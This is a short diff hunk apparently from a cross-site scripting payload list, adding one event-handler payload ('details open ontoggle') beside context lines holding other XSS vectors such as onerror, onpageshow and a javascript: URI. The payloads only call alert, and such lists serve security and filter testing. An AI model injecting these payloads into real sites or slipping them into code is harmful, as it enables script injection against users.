@@ -2200,3 +2200,4 @@ location='javascript://\u2028alert(1)';
 <applet/object onerror=alert('XSS')> 
 <frameset/onpageshow=alert(1)> 
 <div onactivate=alert('Xss') id=xss style=overflow:scroll>
+<details open ontoggle=alert(1)>
